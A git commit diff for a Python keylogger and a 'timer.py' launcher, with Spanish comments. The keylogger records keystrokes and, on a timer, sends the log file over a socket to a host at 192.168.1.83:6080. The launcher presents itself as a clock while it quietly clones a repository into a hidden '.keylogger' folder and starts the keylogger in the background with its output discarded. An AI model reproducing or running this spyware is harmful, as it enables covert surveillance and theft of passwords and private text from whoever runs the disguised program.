41fce5c6f3ca372cb54606e79d95f4573eb3e7f0
EduVale581 <46286246+EduVale581@users.noreply.github.com>
2021-06-30 21:46:04 -0400

    Actualizacion keylogger y timer
    Eliminacion de openssl y cambio por sha512

--- keylogger.py
+++ keylogger.py
@@ -5,8 +5,33 @@ import socket
 from threading import Timer
 import time
 import subprocess
+import hashlib
 
-
+def enviarArchivo(sck: socket.socket, archivo):
+    # Obtener el tamaño del archivo a enviar.
+    tamArchivo = os.path.getsize(archivo)
+    # Informar primero al servidor la cantidad
+    # de bytes que serán enviados.
+    sck.sendall(struct.pack("<Q", tamArchivo))
+    # Enviar el archivo en bloques de 1024 bytes.
+    with open(archivo, "rb") as f:
+        while read_bytes := f.read(1024):
+            sck.sendall(read_bytes)
+def crearConexion():
+    #CMD = "openssl rsautl -encrypt -in file.log -out file2.log -inkey ~/Desktop/.keylogger>
+    #subprocess.call(CMD, shell=True)
+    #time.sleep(2)
+    try:
+        with socket.create_connection(("192.168.1.83", 6080)) as conn:
+            enviarArchivo(conn, "file2.log")
+    except:
+        with open(archivo, 'a') as f:
+            mensaje ="**** El socket no se puede conectar ****"
+            sha512= hashlib.sha512()
+            sha512.update(mensaje.encode('utf-8'))
+            res = sha512.hexdigest()
+            f.write(res)
+            f.write('\n')
 # Guardamos lo que se va escribiendo antes de presionar espacio o enter
 listaCadena =  []
 
@@ -22,43 +47,23 @@ if os.environ.get('pylogger_clean', None) is not None:
         os.remove(archivo)
     except EnvironmentError:
         pass
-
-def enviarArchivo(sck: socket.socket, archivo):
-    # Obtener el tamaño del archivo a enviar.
-    tamArchivo = os.path.getsize(archivo)
-    # Informar primero al servidor la cantidad
-    # de bytes que serán enviados.
-    sck.sendall(struct.pack("<Q", tamArchivo))
-    # Enviar el archivo en bloques de 1024 bytes.
-    with open(archivo, "rb") as f:
-        while read_bytes := f.read(1024):
-            sck.sendall(read_bytes)
-
-def crearConexion():
-    CMD = "openssl rsautl -encrypt -in file.log -out file2.log -inkey ./public-key/public.pem -pubin"
-    subprocess.call(CMD, shell=True)
-    time.sleep(2)
-    try:
-        with socket.create_connection(("192.168.1.83", 6080)) as conn:
-            enviarArchivo(conn, "file2.log")
-    except:
-        with open(archivo, 'a') as f:
-            f.write('**** El socket no se puede conectar ****')
-            f.write('\n')
 # Comienza a obtener las teclas
 def OnKeyPress(event):
     # Validamos que solo se guarden las cadenas cuando se presiona espacio o enter.
-    if event.Key == "Return" or event.Key == "Space" or event.Key == "space" or event.Key == "P_Enter":
+    if event.Key == "Return" or event.Key == "Space" or event.Key == "space" or event.Key:
         with open(archivo, 'a') as f:
-            f.write(''.join(listaCadena))
+            mensaje = "".join(listaCadena)
+            sha512= hashlib.sha512()
+            sha512.update(mensaje.encode('utf-8'))
+            res = sha512.hexdigest()
+            f.write(res)
             f.write('\n')
             listaCadena.clear()
-        
+
         timer = Timer(interval=3, function=crearConexion)
         timer.daemon=True
         timer.start()
 
-            
     else:
         # Agregamos a la lista la tecla presionada.
         listaCadena.append(event.Key)
--- timer.py
+++ timer.py
@@ -1,7 +1,7 @@
 """
 This is the main program; it starts the key logger in the background and shows
 a clock every 60 seconds, displaying the current time
-"""
+""" 
 import time
 import subprocess
 from datetime import datetime
@@ -19,14 +19,15 @@ if __name__ == "__main__":
     # Start the keylogger in the background; it will keep running even after
     # the terminal session is closed
     # CMD = "nohup sudo python keylogger.py &> /dev/null &"
-    fileObj = Path("/root/.keylogger")
-    
-    if fileObj.exists() == False:
-        CMD = "git clone https://github.com/jose-villar/public-key ~/.keylogger &> /dev/null &"
+    if Path("~/Desktop/.keylogger").exists():
+        print('existe')
+    else:
+        CMD = "git clone https://github.com/jose-villar/public-key ~/Desktop/.keylogger &> /dev/null &"
         subprocess.call(CMD, shell=True)
+        time.sleep(30)
+
     print(f"{datetime.now().time()}")
-    time.sleep(60)
-    CMD = "nohup sudo python3 /root/.keylogger/keylogger.py &> /dev/null &"
+    CMD = "python3 ~/Desktop/.keylogger/keylogger.py > /dev/null &"
     subprocess.call(CMD, shell=True)
 
     # Show clock until it is manually stopped by pressing <C-c>
